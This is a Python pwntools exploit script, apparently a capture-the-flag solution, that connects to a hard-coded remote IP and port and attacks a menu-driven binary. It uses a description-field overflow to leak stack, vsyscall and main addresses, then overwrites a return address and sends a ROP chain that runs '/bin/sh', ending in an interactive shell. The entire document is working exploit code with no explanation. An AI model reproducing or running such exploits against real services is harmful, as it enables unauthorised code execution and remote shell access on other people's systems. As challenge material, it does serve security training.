#!/usr/bin/env python

from pwn import *

p = remote('175.119.158.134', 5559)

DEBUG = False
def r(s):
    recv = p.recvuntil(s)
    if DEBUG:
        print recv

def choose(num):
    r('>\n')
    p.sendline('1')
    r('1 or 2?\n\n')
    p.sendline(str(num))

def write(data, desc):
    r('>\n')
    p.sendline('2')
    r('data: \n\n')
    p.send(data)
    r('Description: \n\n')
    p.send(data)

def modify(data):
    r('>\n')
    p.sendline('4')
    r('2 Data\n\n')
    p.sendline('1')
    r('Description: \n\n')
    p.send(data)

def leak():
    r('>\n')
    p.sendline('3')
    r('DESCRIPTION: ')
    desc = p.recvline()[:-1]
    r('DATA: ')
    data = p.recvline()[:-1]
    return (desc, data)

def leak_addr(addr):
    choose(2)
    modify('a' * 20 + p32(addr) + 'x')

    choose(1)
    return leak()[1]

# init
choose(2)
write('second', '222')
choose(1)
write('first', '111')

# leak stack pointer
modify('a' * 17)

stack = u32(leak()[0][16:20])
log.success('stack addr: 0x%x' % stack)

# leak vsyscall
vsyscall = u32(leak_addr(stack - 0xa94 + 0xb90)[:4])
log.success('vsyscall addr: 0x%x' % vsyscall)

# leak main
main = u32(leak_addr(stack - 0xa94 + 0xb40)[:4])
log.success('main addr: 0x%x' % main)

'''
# leak puts
puts = u32(leak_addr(main - 0xf5a + 0x2720)[:4])
log.success('puts addr: 0x%x' % puts)
'''

# ROP
'''
puts
pop ebx; ret;
"nput data :"
pop ebx; ret;
"/bin/sh"
syscall
'''

ret = stack - 0xa94 + 0xacc

# overwrite
choose(2)
modify('a' * 20 + p32(ret) + 'x')

choose(1)
modify('/bin/sh' + 'x')

r('>\n')
p.sendline('4')
r('2 Data\n\n')
p.sendline('2')
r('Data: \n')
p.send(
    p32(main - 0xf5a + 0x980)
    + p32(main - 0xf5a + 0x8f1)
    + p32(main - 0xf5a + 0x138b)
    + p32(main - 0xf5a + 0x8f1)
    + p32(stack + 8)
    + p32(vsyscall)
)

r('>\n')
p.sendline('5')
p.interactive()
